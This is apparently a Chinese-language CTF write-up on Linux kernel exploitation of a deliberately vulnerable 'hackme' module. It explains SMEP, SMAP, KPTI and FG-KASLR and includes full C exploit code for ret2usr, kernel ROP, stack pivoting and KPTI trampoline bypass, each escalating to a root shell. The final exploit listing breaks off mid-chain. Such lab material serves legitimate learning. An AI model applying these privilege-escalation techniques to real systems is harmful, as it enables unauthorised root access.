## Pwn

### kernel-rop (lkmidas 版)

```
├── extract-image.sh // 從 vmlinuz 取出 kernel elf 的腳本
├── initramfs.cpio.gz // Linux fs that is compressed with cpio and gzip
├── run.sh // 包含 qemu 執行的指令，以及 linux boot 的環境
└── vmlinuz // compressed Linux kernel
```

拿到這些檔案後，可以先用 `./extract-image.sh ./vmlinuz > vmlinux` 將 kernel elf 取出來，並且執行 `ROPgadget --binary ./vmlinux > gadgets.txt` 取得 ROP gadget，因為 vmlinux kernel 比較大，因此每一次跑 `ROPgadget` 都要花很久的時間，因此建議先輸出到一個檔案內。而後執行 `gunzip initramfs.cpio.gz && cpio -i -vd < initramfs.cpio` 將壓縮後的 file system 解壓縮，而當我們取得 fs 內的檔案後，可以任意更改，並用 `find . -print0 | cpio --null -ov --format=newc > initramfs.cpio` 打包回去。

而在 `./rootfs/etc/init.d` 底下，則會有名稱為 `rcS` 或是 `inittab` 的檔案，用於在 boot 完後執行:

```bash
#!/bin/sh

/bin/busybox --install -s

stty raw -echo

chown -R 0:0 /

mkdir -p /proc && mount -t proc none /proc
mkdir -p /dev  && mount -t devtmpfs devtmpfs /dev
mkdir -p /tmp  && mount -t tmpfs tmpfs /tmp

echo 1 > /proc/sys/kernel/kptr_restrict
echo 1 > /proc/sys/kernel/dmesg_restrict
chmod 400 /proc/kallsyms

insmod /hackme.ko
chmod 666 /dev/hackme

# setuidgid 0 /bin/sh
```

kernel pwn 的目標通常是取得 root 權限，而在 debug 時可以透過 `setuidgid 0 /bin/sh` 取得 root 權限的 shell，因為部分檔案會需要 root 權限才能夠讀取，如:

- `/proc/kallsyms`: 列出所有 kernel symbol 所對應到的 address
- `/sys/module/core/sections/.text`: 印出 kernel .text section 的 address (不過通常題目不會有 `/sys` pfs)

run.sh (有時候會叫做 boot.sh):

```bash
#!/bin/sh
qemu-system-x86_64 \
    -m 128M \
    -cpu kvm64,+smep,+smap \
    -kernel vmlinuz \
    -initrd initramfs.cpio.gz \
    -hdb flag.txt \
    -snapshot \
    -nographic \
    -monitor /dev/null \
    -no-reboot \
    -append "console=ttyS0 kaslr kpti=1 quiet panic=1"
```

- `-m`: memory size，有時可能是造成無法 boot 的原因
- `-cpu`: 指定 CPU model，smep 與 smap 都是保護機制
- `-kernel`: compressed kernel image
- `-initrd`: compressed file system
- `-append`: 額外的 boot option
  - `-hdb`: put `flag.txt` into `/dev/sda` (Use file as hard disk 0)
- `-s`: qemu 會自動開啟 gdb server 在 1234 port，gdb 中可以透過 `target remote 0:1234` 連上
  - `gdb --nx vmlinux` (`--nx`) 可以 disable gdb script，避免出現奇怪的問題

而 kernel 也像 user program 一樣，有一些自己的保護機制:

- Kernel stack cookies (or canaries): 就是 canary，而在 kernel compile 時就已經加上，因此不能 disable
- KASLR (kernel address space layout randomization): kernel 版的 ASLR
  - `-append "kaslr"`
  - `-append "nokaslr"`
- Supervisor mode execution protection (SMEP): 用 CR4 的 20th bit 來控制是否開啟，會 mark 所有的 user mode page 為 non-executable
  - `-cpu +smep`
  - `-append "nosmep"`
- Supervisor Mode Access Prevention (SMAP): 用於補充 SMEP，CR4 的 21th bit 來控制，代表不能存取 (read/write) userland page
  - `-cpu +smap`
  - `-append "nosmap"`
- Kernel page-table isolation (KPTI): kernel 會把 user-page 以及 kernel-page 分離，分離的方式為將 page 分成兩個集合:
  - 包含所有 kernel + user 的 page table set，不過 kernel mode 時才會使用
  - 包含最小集合的 kernel-space address + 複製的 user-space
  - `-append "kpti=1"`
  - `-append "nopti"`

kernel module hackme.ko 內先使用 `misc_register()` 註冊 hackme miscdevice，miscdevice 的 struct 如下:

```c
struct miscdevice  {
 int minor;
 const char *name;
 const struct file_operations *fops; // fops 為 file operation，定義使用 fcntl() 或是 orw 等等對這個 device 做 operation 時，module 會有怎樣的行為
 struct list_head list;
 struct device *parent;
 struct device *this_device;
 const char *devnode;
};
```

一共有四個 operation: `hackme_read`, `hackme_write`, `hackme_open `and `hackme_release`。

```c
ssize_t __fastcall hackme_read(file *f, char *data, size_t size, loff_t *off)
{
  ...
  _memcpy(hackme_buf, tmp, size);
  if ( size > 0x1000 )
  {
    _warn_printk("Buffer overflow detected (%d < %lu)!\n", 4096LL);
    BUG();
  }
  v6 = copy_to_user(data, hackme_buf, v5) == 0;
  ...
}

ssize_t __fastcall hackme_write(file *f, const char *data, size_t size, loff_t *off)
{
  if ( size > 0x1000 )
  {
    _warn_printk("Buffer overflow detected (%d < %lu)!\n", 4096LL);
    BUG();
  }
  copy_from_user(hackme_buf, data, v5);
  _memcpy(tmp, hackme_buf, v5);
  ...
}
```

`read()` 會先從 `tmp` copy `size` (<= 0x1000) 大小的資料到 `hackme_buf`，再透過 `copy_to_user()` 回傳 userland；`write()` 會先從 `hackme_buf` copy `size` (<= 0x1000) 大小的資料到 `tmp`，再透過 `copy_from_user()` 讀 userland 的資料；而 `BUG()` 是 `ud2` undefined instruction，能夠 raise invalid opcode exception。

#### ret2usr

qemu configuration (也可以想成是題目的限制):

- remove: `smep`、`smap`、`kpti=1`、`kslr`
- add: `nopti`、`nokaslr`

第一次在打 Pwn 時，通常會接觸到 NX 沒開 + stack overflow，可以直接執行 shellcode 的攻擊方法，而 ret2usr 也是類似的概念，透過控制 return address (bof)，跳到 userland 定義的 function 直接執行。

當可以控制 control flow 時，需要在 kernel mode 執行 `commit_creds(prepare_kernel_cred(0))` 來做 privilege escalation

- `prepare_kernel_cred()` 建立一個新的 credential (cred)，0 代表 cred 中的 uid, gid 設為0 (root)
- `commit_creds()` 將 cred 應用在現在的 process，因此 process 的權限即為 root

而 kernel mode 要回 usermode 時，必須要 `iretq` (interrupt return)，[x86 instruction](https://www.felixcloutier.com/x86/iret:iretd) 有列出 `iretq` 在不同指令集的模式下有不同的 operation，而 amd64 屬於 `IA-32e-MODE`:

```
IA-32e-MODE:
    IF NT = 1
        THEN #GP(0);
    ELSE IF OperandSize = 32
        THEN
                EIP ← Pop();
                CS ← Pop();
                tempEFLAGS ← Pop();
        ELSE IF OperandSize = 16
                THEN
                        EIP ← Pop(); (* 16-bit pop; clear upper bits *)
                        CS ← Pop(); (* 16-bit pop *)
                        tempEFLAGS ← Pop(); (* 16-bit pop; clear upper bits *)
                FI;
        ELSE (* OperandSize = 64 *)
                THEN
                            RIP ← Pop();
                            CS ← Pop(); (* 64-bit pop, high-order 48 bits discarded *)
                            tempRFLAGS ← Pop();
    FI;
    IF CS.RPL > CPL
        THEN GOTO RETURN-TO-OUTER-PRIVILEGE-LEVEL;
        ELSE
                IF instruction began in 64-Bit Mode
                        THEN
                            IF OperandSize = 32
                                THEN
                                    ESP ← Pop();
                                    SS ← Pop(); (* 32-bit pop, high-order 16 bits discarded *)
                            ELSE IF OperandSize = 16
                                THEN
                                    ESP ← Pop(); (* 16-bit pop; clear upper bits *)
                                    SS ← Pop(); (* 16-bit pop *)
                                ELSE (* OperandSize = 64 *)
                                    RSP ← Pop();
                                    SS ← Pop(); (* 64-bit pop, high-order 48 bits discarded *)
                            FI;
                FI;
                GOTO RETURN-TO-SAME-PRIVILEGE-LEVEL; FI;
END;
```

stack 由上到下必須放置 `RIP | CS | tempRFLAGS | RSP | SS`，所以在進入 kernel mode 前，就可以先把這些 register 的值儲存起來，而在 return 回 shellcode 前重新 push 到 stack 當中 (kernel 不會動到 `user_<reg>`)，並且在 push 回去前，必須執行 `swapgs`: 

- swap the `GS` register between `kernel-mode` and `user-mode`
- exchanges the CPL 0 data pointer from the IA32_KERNEL_GS_BASE MSR with the GS base register

```
IF CS.L ≠ 1 (* Not in 64-Bit Mode *)
    THEN
        #UD; FI;
IF CPL ≠ 0
    THEN #GP(0); FI;
tmp ← GS.base;
GS.base ← IA32_KERNEL_GS_BASE;
IA32_KERNEL_GS_BASE ← tmp;
```

這邊用一個一個 push 回去的方法，而也可以用 `swapgs_restore_regs_and_return_to_usermode `。

exploit:

```c
#define _GNU_SOURCE
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>

int devfd;
unsigned long user_cs, user_ss, user_rflags, user_sp;
unsigned long canary;
unsigned long prepare_kernel_cred = 0xffffffff814c67f0;
unsigned long commit_creds = 0xffffffff814c6410;

void open_dev()
{
    if ((devfd = open("/dev/hackme", O_RDWR)) < 0)
        perror("[-] open dev failed");
    puts("[+] open dev success");
}

void leak()
{
    char data[0x100];
    if (read(devfd, data, sizeof(data)) < 0)
        perror("[-] read dev failed");
    canary = *(unsigned long *) (data + (0xa0-0x20));
    puts("[+] leak canary success");
    printf("[*] canary: 0x%08lx\n", canary);
}

void get_shell()
{
    system("sh");
}

unsigned long user_rip = (unsigned long) get_shell;
void esc_priv()
{
    __asm__ volatile(
        ".intel_syntax noprefix \n"
        "mov rax, prepare_kernel_cred \n"
        "xor rdi, rdi \n"
        "call rax \n"
        "mov rdi, rax \n"
        "mov rax, commit_creds \n"
        "call rax \n"
        "swapgs \n"
        "mov r15, user_ss \n"
        "push r15 \n"
        "mov r15, user_sp \n"
        "push r15 \n"
        "mov r15, user_rflags \n"
        "push r15 \n"
        "mov r15, user_cs \n"
        "push r15 \n"
        "mov r15, user_rip \n"
        "push r15 \n"
        "iretq \n"
        ".att_syntax \n"
    );
}

void save_status()
{
    __asm__ volatile(
        ".intel_syntax noprefix \n"
        "mov user_cs, cs \n"
        "mov user_ss, ss \n"
        "mov user_sp, rsp \n"
        "pushf \n"
        "pop user_rflags \n"
        ".att_syntax \n"
    );
    puts("[*] save status");
}

void overflow()
{
    unsigned long rop[0x20];
    int off = (0xa0 - 0x20) / sizeof(unsigned long);
    rop[off++] = canary; // 0x20
    rop[off++] = 0; // 0x18
    rop[off++] = 0; // 0x10
    rop[off++] = 0; // 0x08
    rop[off++] = (unsigned long) esc_priv;

    if (write(devfd, rop, sizeof(rop)) < 0)
        perror("[-] write dev failed");
    puts("[+] write dev success");

}

int main()
{
    save_status();
    open_dev();
    leak();
    overflow();
    return 0;
}
```

assembly code:

- `.intel_syntax noprefix` 能讓 gcc 編譯 intel 語法的 inline assembly，而 `noprefix` 是用來 disable register 的 `%` 前綴，在 `__asm__()` 的最後須要將 syntax  recover 回 `att_syntax`，確保後續的 assemble 不會壞掉 (default 是用 AT&T)，範例如下:

  ```c
  __asm__(
  ".intel_syntax noprefix \n"
  "mov rdi \n"
  "mov rsi \n"
  ".att_syntax \n"
  : input operand : output operand : clobber list
  );
  ```

- [asm inline](https://b8807053.pixnet.net/blog/post/3612016)

- [asm inline example](https://stackoverflow.com/a/37956967)



##### Next

現在讓執行環境多了 `SMEP` 的限制，對比一開始學時 Pwn 的時候，可以想像成是 stack 加了 NX，而 NX 的限制會使用 ROP 來繞過，因此有了 SMEP 的環境也可以使用 kernel ROP 來做 exploit，以下兩種情境的 exploit 方式不一樣:

- 可以任意控制 kernel stack
- 只能 overwrite return address

CR4 的第 20 bit (`0x100000`) 是用來控制 SMEP，如果有 gadget 如 `mov cr4, rdi` 可以使用，或者是原生的 kernel function `native_write_cr4(val)`，就能改寫掉 cr4 的內容。

如果要查看 cr4 的值的話，可以直接執行原本的 exploit，並在 crash 時印出的 debug information 找到 (`00000000001006f0`)，也可以透過 gdb 來看。exploit 只需改變 `overflow()` function 為:

```c
void overflow()
{
    unsigned long rop[0x20];
    int off = (0xa0 - 0x20) / sizeof(unsigned long);
    rop[off++] = canary; // 0x20
    rop[off++] = 0; // 0x18
    rop[off++] = 0; // 0x10
    rop[off++] = 0; // 0x08
    rop[off++] = pop_rdi_ret; //      <-- add
    rop[off++] = 0x6f0; //            <-- add
    rop[off++] = native_write_cr4; // <-- add
    rop[off++] = (unsigned long) esc_priv;

    if (write(devfd, rop, sizeof(rop)) < 0)
        perror("[-] write dev failed");
    puts("[+] write dev success");
}
```

`ROPgadget` 在找 gadget 時並不會判斷說哪個地方是 .text，哪個地方是 .data，因此可能會遇到 gadget 無法執行的情況。

而在修改 20 bit of cr4 時，出現了 error msg `pinned CR4 bits changed`，[參考這篇文章](https://patchwork.kernel.org/project/kernel-hardening/patch/20190220180934.GA46255@beast/#22495645)所說，在比較新的 kernel 中，cr4 中有些 bit 在 boot 時就已經 pinned，也就是不會在 runtime 被 common function 如 `native_write_cr4()` 所更改，被 pin 的 bit 有 `SMEP`, `SMAP`, and `UMIP`，以下為 `native_write_cr4()` 的 source code:

```c
static const unsigned long cr4_pinned_mask =
	X86_CR4_SMEP | X86_CR4_SMAP | X86_CR4_UMIP | X86_CR4_FSGSBASE;
...
void native_write_cr4(unsigned long val)
{
	unsigned long bits_changed = 0;

set_register:
	asm volatile("mov %0,%%cr4": "+r" (val) : : "memory");

	if (static_branch_likely(&cr_pinning)) {
		if (unlikely((val & cr4_pinned_mask) != cr4_pinned_bits)) {
			bits_changed = (val & cr4_pinned_mask) ^ cr4_pinned_bits;
			val = (val & ~cr4_pinned_mask) | cr4_pinned_bits;
			goto set_register;
		}
		/* Warn after we've corrected the changed bits. */
		WARN_ONCE(bits_changed, "pinned CR4 bits changed: 0x%lx!?\n",
			  bits_changed);
	}
}
```

沒辦法 return 回 user code，就只能在 kernel 做 ROP，不過還是需要執行到一些必要的 function:

- `prepare_kernel_cred(0)`
- `commit_creds()`
- `swapgs ; ret`
- `iret` + `RIP | CS | RFLAGS | SP | SS`

```c
unsigned long prepare_kernel_cred = 0xffffffff814c67f0;
unsigned long commit_creds = 0xffffffff814c6410;
unsigned long pop_rdi_ret = 0xffffffff81006370;

unsigned long pop_rdx_ret = 0xffffffff81007616;
unsigned long cmp_rdx_8_jne_pop_rbx_pop_rbp_ret = 0xffffffff81964cc4;
unsigned long mov_rdi_rax_jne_pop_rbx_pop_rbp_ret = 0xffffffff8166fea3;
unsigned long swapgs_pop_rbp_ret = 0xffffffff8100a55f;
unsigned long iretq = 0xffffffff8100c0d9;

unsigned long user_rip = (unsigned long) get_shell;
void overflow()
{
    unsigned long rop[50];
    int off = (0xa0 - 0x20) / sizeof(unsigned long);
    rop[off++] = canary; // 0x20
    rop[off++] = 0; // 0x18
    rop[off++] = 0; // 0x10
    rop[off++] = 0; // 0x08
    rop[off++] = pop_rdi_ret;
    rop[off++] = 0;
    rop[off++] = prepare_kernel_cred;
    rop[off++] = pop_rdx_ret;
    rop[off++] = 8;
    rop[off++] = cmp_rdx_8_jne_pop_rbx_pop_rbp_ret;
    rop[off++] = 0;
    rop[off++] = 0;
    rop[off++] = mov_rdi_rax_jne_pop_rbx_pop_rbp_ret;
    rop[off++] = 0;
    rop[off++] = 0;
    rop[off++] = commit_creds;
    rop[off++] = swapgs_pop_rbp_ret;
    rop[off++] = 0;
    rop[off++] = iretq;
    rop[off++] = user_rip;
    rop[off++] = user_cs;
    rop[off++] = user_rflags;
    rop[off++] = user_sp;
    rop[off++] = user_ss;

    if (write(devfd, rop, sizeof(rop)) < 0)
        perror("[-] write dev failed");
    puts("[+] write dev success");
}
```



##### Next

當 overflow 的空間不夠時，必須想辦法把 rsp 改到自己可以控制的地方 (stack pivoting)，如果有 `mov esp, <const>` 這種 gadget，就能透過 mmap 建造一個 memory region 來寫 ROP，並 overwrite return address 成那個 gadget，這樣就可以成功 stack pivoting。

```c
int stack_off = 0x1000 / 8;
unsigned long *stack = mmap(0x5b000000-0x2000, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
stack[0] = 0xdeadbeef;
stack[stack_off++] = 0x0;
stack[stack_off++] = 0x0;
stack[stack_off++] = pop_rdi_ret;
stack[stack_off++] = 0;
stack[stack_off++] = prepare_kernel_cred;
stack[stack_off++] = pop_rdx_ret;
stack[stack_off++] = 8;
stack[stack_off++] = cmp_rdx_8_jne_pop_rbx_pop_rbp_ret;
stack[stack_off++] = 0;
stack[stack_off++] = 0;
stack[stack_off++] = mov_rdi_rax_jne_pop_rbx_pop_rbp_ret;
stack[stack_off++] = 0;
stack[stack_off++] = 0;
stack[stack_off++] = commit_creds;
stack[stack_off++] = swapgs_pop_rbp_ret;
stack[stack_off++] = 0;
stack[stack_off++] = iretq;
stack[stack_off++] = user_rip;
stack[stack_off++] = user_cs;
stack[stack_off++] = user_rflags;
stack[stack_off++] = user_sp;
stack[stack_off++] = user_ss;
```

`stack[0] = 0xdeadbeef` 的目的是避免觸發 Double Fault `PANIC: double fault`，因為 mmap 後 page 並不會被載入，直到被存取才會觸發 page fault，但是因為要修改的地方在第二個 page，所以應該要先存取第一個 page 讓 page 被載入才行。

- `Double fault`: occurs if the processor encounters a problem while **trying to service a pending interrupt or exception**. An example situation when a double fault would occur is when **an interrupt is triggered** but the **segment in which the interrupt handler resides is invalid**. If the processor encounters a problem when calling the double fault handler, a triple fault is generated and the processor shuts down
- [Page fault in Interrupt context](https://stackoverflow.com/questions/4848457/page-fault-in-interrupt-context)
- 以這個例子來說，如果第一個 page 沒有被存取到，則在 kernel mode 存取時會觸發 page fault，而造成 `interrup` + `page fault` 同時發生，這樣就會有 Double fault 的情況，而 kernel 沒辦法 kill interrup handler，因此只能 reboot



##### Next

`KPTI` (Kernel page-table isolation) 可以分隔 user-space and kernel-space page tables:

- One set of page tables includes both **kernel-space and user-space addresses same as before**, but it is only used when the system is running in **kernel mode**

- The second set of page tables for use in **user mode** contains a **copy of user-space** and a **minimal set of kernel-space addresses**

- process 自己的 page table 由 CR3 register 所指著。而在沒有 `KPTI` 時，kernel-space 以及 user space 共用同個 PGD，避免在切換時要 TLB flush、swap table 等等需要很大開銷的操作

- 每個 process 有兩個 page table，kernel page table 以及 user page table，kernel page table 只能在 kernel-mode 存取，內容包含 kernel / user space mapping；user page table 只有 user space，不過因為 context switch，因此 user page table 仍需要少量的 kernel space，用來建立 interrupt entry 以及 exit

- 當 interrupt 發生時會切換 cr3，而 `cr3 + 0x1000` 指向 PGD user、`cr3` 指向 PGD kernel

- 不過 kernel mode 似乎也可以存取 PGD user (在沒有 `iretq` 前)

- 因此當提權後透過 `iretq` 回去 user space 時，如果 `cr3` 仍為 kernel page，就會 trigger `segmentation fault`，而在 kernel 中仍有辦法繞過:

  ```assembly
  mov     rdi, cr3
  or      rdi, 1000h
  mov     cr3, rdi
  ```



Bypass `KPTI` 有兩種方式:

- Signal handler: 當因為 KPTI 而觸發 SIGSEGV 時，如果已經將 `get_shell()` define 成 SIGSEGV signal handler，則可以直接取得 shell。此方法只需要加上:

  ```c
  #include <signal.h>
  
  signal(SIGSEGV, get_shell);
  ```

- KPTI trampoline: if a syscall returns normally, there must be **a piece of code in the kernel** that will **swap the page tables back to the userland ones**, so we will try to **reuse that code** to our purpose
  - `swapgs_restore_regs_and_return_to_usermode()`

調整一下 ROP，改換做使用 `swapgs_restore_regs_and_return_to_usermode()`，不過此 function 前面在做一些沒必要的 pop，因此可以直接從 `swapgs_restore_regs_and_return_to_usermode+22` 開始執行，整個 trampoline 如下:

```
<_stext+2101030>    mov    rdi, rsp
<_stext+2101033>    mov    rsp, qword ptr gs:[0x6004]
<_stext+2101042>    push   qword ptr [rdi + 0x30]
<_stext+2101045>    push   qword ptr [rdi + 0x28]
<_stext+2101048>    push   qword ptr [rdi + 0x20]
<_stext+2101051>    push   qword ptr [rdi + 0x18]
<_stext+2101054>    push   qword ptr [rdi + 0x10]
<_stext+2101057>    push   qword ptr [rdi]
<_stext+2101059>    push   rax
<_stext+2101060>    nop    
<_stext+2101062>    mov    rdi, cr3
<_stext+2101065>    jmp    _stext+2101119 <_stext+2101119>

<_stext+2101119>    or     rdi, 0x1000
<_stext+2101126>    mov    cr3, rdi
<_stext+2101129>    pop    rax
<_stext+2101130>    pop    rdi
<_stext+2101131>    swapgs
<_stext+2101134>    nop    dword ptr [rax]
<_stext+2101137>    jmp    _stext+2101184 <_stext+2101184>
<_stext+2101184>    test   byte ptr [rsp + 0x20], 4
<_stext+2101189>    jne    _stext+2101193 <_stext+2101193>
<_stext+2101191>    iretq
```

短短的幾個 instruction，`pop`、`swapgs`、`iretq`、recover cr3 什麼都有了，exploit 只需要改變 ROP 的 gadget 即可:

```c
    stack[stack_off++] = mov_rdi_rax_jne_pop_rbx_pop_rbp_ret;
    stack[stack_off++] = 0;
    stack[stack_off++] = 0;
    stack[stack_off++] = commit_creds;
    stack[stack_off++] = swapgs_restore_regs_and_return_to_usermode + 0x16;
    stack[stack_off++] = 0;
    stack[stack_off++] = 0;
    stack[stack_off++] = user_rip;
    stack[stack_off++] = user_cs;
    stack[stack_off++] = user_rflags;
    stack[stack_off++] = user_sp;
    stack[stack_off++] = user_ss;
```

- 原生 gdb 中 list map
  - `maintenance info sections`
  - `info proc mappings`



##### Next

SMAP 為第 21 bit of CR4，連 user space address 都不能夠存取了，不過既然有 `copy_from_user()`，一定會需要 touch user space address，所以一定有 gadget 可以使用。

- 原本第一種情況的 exploit 仍然可以使用 (signal)，因為沒有存取到 userland 的資料
- 第二種使用 stack pivoting 到 userland，所以不能使用，而在 SMAP、SMEP、KPTI 的情況下，只能蓋一個 return address 似乎沒辦法做到什麼事情，仍需要其他的 primitive (先決條件) 才能 exploit
  - 所以如果有辦法在程式中找到漏洞，能夠控制不只一個 return address 的空間，以及有 gadget 可以把 stack 遷至那，應該就可以堆 ROP & exploit 了
- 查看 `arch/x86/libc/copy_user_64.S` 可以看到 instruction `stac` 以及 `clac` 用來 allow / disallow SMAP
  - `stac` (Set AC Flag)
  - `clac` (Clear AC Flag)
  - 不確定可不可行 (fault in user-space)



##### Next

有了 `KASLR`，就需要 leak kernel stack 內的 address，並且減掉 offset 得到 kernel base，之後加上各個 gadget 的 offset 就能 exploit 了，不過這題用的是 FG KASLR:

- FG (Function Granular) KASLR
  - symbols get randomized on their own, so there addresses are **not a constant offset from the kernel .text base** like what we used to deal with
  - but there are certain regions in the kernel that never get randomized
- [commit log](https://lwn.net/Articles/824307/)

所以重點是要找出哪些 gadget 是不被影響的，以及找出得到那些 randomized function offset 的方法:

- Functions from `_text base` to `__x86_retpoline_r15`, which is `_text+0x400dc6` are unaffected
- `swapgs_restore_regs_and_return_to_usermode()` is unaffected
- kernel symbol table `ksymtab`, starts at `_text+0xf85198` is unaffected

ksymtab 存 kernel symbol，而 kernel symbol 的 struct 為:

```c
struct kernel_symbol {
	int value_offset;
	int name_offset;
	int namespace_offset;
};
```

`kernel_symbol.value_offset` 是指與 entry 相對的 offset，並非 `_text`。

可以從 `/proc/modules` 找 `kernel_symbol` entry:

```
/ # cat /proc/modules 
hackme 20480 0 - Live 0xffffffffc0338000 (O)
/ # cat /proc/kallsyms | grep ksymtab_commit_creds
ffffffff9dd87d90 r __ksymtab_commit_creds
/ # cat /proc/kallsyms | grep ksymtab_prepare_kernel_cred
ffffffff9dd8d4fc r __ksymtab_prepare_kernel_cred
/ # cat /proc/kallsyms | grep _text | head -n 1
ffffffff9ce00000 T _text
```

並且從 leak 的 stack 當中，找到每次 offset 都是固定的 address，這個部分比較簡單，只要看 leak 出來的 address 就知道末 12 bits 差很多，而不受影響的 (KASLR) 則是 12 bits 固定。注意:

- 8 個 f `0xffffffff00000000` 是 text or stack，可以看裡面存的是 code 還是 data 判斷
- 4 個 f `0xffff000000000000` 是 heap

寫了一個腳本來比對:

```python
#!/usr/bin/python3

import sys

if len(sys.argv) <= 1:
    exit(1)

with open(sys.argv[1], 'r') as f:
    datas = f.read().split('\n')

base = int(datas[-1], 16)
datas = datas[:-1]

out = ""
for data in datas:
    k, v = data.split(": ")
    out += f"{k}: {hex(int(v, 16) - base)}\n"

open(f"{sys.argv[1]}.out", "w").write(out)
```

檔案格式如下，最下面為 `_text` address:

```
[*] 0: 0xffffffff9a9ac560
[*] 8: 0x00000015
...
[*] 496: 0x00403180
[*] 504: 0x00000000
0xffffffff9a200000
```

之後用 `vimdiff <(cat A.out) <(cat B.out)` 查看是否有相同的地方，最後得到結果 `[*] 304: 0xa157` 在兩個檔案中是相同的，求得 kernel base。

之後就找可以使用的 gadget，以及 `/proc/kallsyms` 中 `__ksymtab` 開頭的 symbol 如 `__ksymtab_commit_creds`、`__ksymtab_prepare_kernel_cred`，之後找有用 + 不會受影響的 gadget (不知道怎麼找):

```
0x4d11; // pop rax ; ret
0x015a80; // mov eax, dword ptr [rax] ; pop rbp ; ret

0x200f10; // swapgs_restore_regs_and_return_to_usermode
0xf85198; // ksymtab
0xf87d90; // __ksymtab_commit_creds
0xf8d4fc; // __ksymtab_prepare_kernel_cred
```

文章作者發現在 `__x86_retpoline_r15` 之前的都不會受到 FGKASLR 的影響，不過找不到 source code `arch/x86/boot/compressed/fgkaslr.c`，實在不知道怎麼發現的。

由於 ROP 的大小有限，因此分成個步驟來執行:

- leak `commit_creds`
- leak `prepare_kernel_cred`
- call `prepare_kernel_cred()`
- call `commit_creds()`
  - `get_shell()`

```c
#define _GNU_SOURCE
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <signal.h>

int devfd;
unsigned long user_cs, user_ss, user_rflags, user_sp;
unsigned long canary;
unsigned long base;
unsigned long pop_rax_ret;
unsigned long pop_rdi_ret;
unsigned long read_rax_pop_rbp_ret;
unsigned long __ksymtab_commit_creds;
unsigned long __ksymtab_prepare_kernel_cred;
unsigned long swapgs_restore_regs_and_return_to_usermode;
unsigned long commit_creds, prepare_kernel_cred, cred;
unsigned long tmp;

void leak_commit_creds();
void leak_prepare_kernel_cred();
void call_prepare_kernel_cred();
void call_commit_creds();
void get_shell();

void open_dev()
{
    if ((devfd = open("/dev/hackme", O_RDWR)) < 0)
        perror("[-] open dev failed");
    puts("[+] open dev success");
}

void leak_base()
{
    char data[0x140];
    if (read(devfd, data, sizeof(data)) < 0)
        perror("[-] read dev failed");
    
    canary = *(unsigned long *) (data + (0xa0-0x20));
    base = *(unsigned long *) (data + 304) - 0xa157;
    printf("[*] canary: 0x%08lx\n", canary);
    printf("[*] leak base: 0x%08lx\n", base);
    
    /* gadget */
    pop_rax_ret = base + 0x4d11;
    pop_rdi_ret = base + 0x6370;
    read_rax_pop_rbp_ret = base + 0x15a80;
    __ksymtab_commit_creds = base + 0xf87d90;
    __ksymtab_prepare_kernel_cred = base + 0xf8d4fc;
    swapgs_restore_regs_and_return_to_usermode = base + 0x200f10;
    
    printf("[*] pop_rax_ret: 0x%08lx\n", pop_rax_ret);
    printf("[*] pop_rdi_ret: 0x%08lx\n", pop_rdi_ret);
    printf("[*] read_rax_pop_rbp_ret: 0x%08lx\n", read_rax_pop_rbp_ret);
    printf("[*] __ksymtab_commit_creds: 0x%08lx\n", __ksymtab_commit_creds);
    printf("[*] __ksymtab_prepare_kernel_cred: 0x%08lx\n", __ksymtab_prepare_kernel_cred);
    printf("[*] swapgs_restore_regs_and_return_to_usermode: 0x%08lx\n", swapgs_restore_regs_and_return_to_usermode);
    puts("wait for attach...");
    getchar();
}

void get_shell()
{
    system("sh");
}

void save_status()
{
    __asm__ volatile(
        ".intel_syntax noprefix \n"
        "mov user_cs, cs \n"
        "mov user_ss, ss \n"
        "mov user_sp, rsp \n"
        "pushf \n"
        "pop user_rflags \n"
        ".att_syntax \n"
    );
    puts("[*] save status");
}

void leak_commit_creds()
{
    unsigned long user_rip = (unsigned long) leak_prepare_kernel_cred;
    
    /* rop */
    unsigned long rop[50];
    int off = (0xa0 - 0x20) / sizeof(unsigned long);
    rop[off++] = canary; // 0x20
    rop[off++] = 0; // 0x18
    rop[off++] = 0; // 0x10
    rop[off++] = 0; // 0x08
    rop[off++] = pop_rax_ret;
    rop[off++] = __ksymtab_commit_creds;
    rop[off++] = read_rax_pop_rbp_ret;
    rop[off++] = 0;
    rop[off++] = swapgs_restore_regs_and_return_to_usermode + 0x16;
    rop[off++] = 0;
    rop[off++] = 0;
    rop[off++] = user_rip;
    rop[off++] = user_cs;
    rop[off++] = user_rflags;
    rop[off++] = user_sp;
    rop[off++] = user_ss;

    if (write(devfd, rop, sizeof(rop)) < 0)
        perror("[-] write dev failed");
    puts("[+] leak commit_creds");
}

void leak_prepare_kernel_cred()
{
    __asm__ volatile(
        ".intel_syntax noprefix \n"
        "mov tmp, rax \n"
        ".att_syntax \n"
    );
    commit_creds = (int) tmp + __ksymtab_commit_creds;

    unsigned long user_rip = (unsigned long) call_prepare_kernel_cred;
    
    /* rop */
    unsigned long rop[50];
    int off = (0xa0 - 0x20) / sizeof(unsigned long);
    rop[off++] = canary; // 0x20
    rop[off++] = 0; // 0x18
    rop[off++] = 0; // 0x10
    rop[off++] = 0; // 0x08
    rop[off++] = pop_rax_ret;
    rop[off++] = __ksymtab_prepare_kernel_cred;
    rop[off++] = read_rax_pop_rbp_ret;
    rop[off++] = 0;
    rop[off++] = swapgs_restore_regs_and_return_to_usermode + 0x16;
    rop[off++] = 0;
    rop[off++] = 0;
    rop[off++] = user_rip;
    rop[off++] = user_cs;
    rop[off++] = user_rflags;
    rop[off++] = user_sp;
    rop[off++] = user_ss;

    if (write(devfd, rop, sizeof(rop)) < 0)
        perror("[-] write dev failed");
    puts("[+] leak prepare_kernel_cred");
}

void call_prepare_kernel_cred()
{
    __asm__ volatile(
        ".intel_syntax noprefix \n"
        "mov tmp, rax \n"
        ".att_syntax \n"
    );
    prepare_kernel_cred = (int) tmp + __ksymtab_prepare_kernel_cred;

    unsigned long user_rip = (unsigned long) call_commit_creds;
    
    /* rop */
    unsigned long rop[50];
    int off = (0xa0 - 0x20) / sizeof(unsigned long);
    rop[off++] = canary; // 0x20
    rop[off++] = 0; // 0x18
    rop[off++] = 0; // 0x10
    rop[off++] = 0; // 0x08
    rop[off++] = pop_rdi_ret;
    rop[off++] = 0;
    rop[off++] = prepare_kernel_cred;
    rop[off++] = swapgs_restore_regs_and_return_to_usermode + 0x16;
    rop[off++] = 0;
    rop[off++] = 0;
    rop[off++] = user_rip;
    rop[off++] = user_cs;
    rop[off++] = user_rflags;
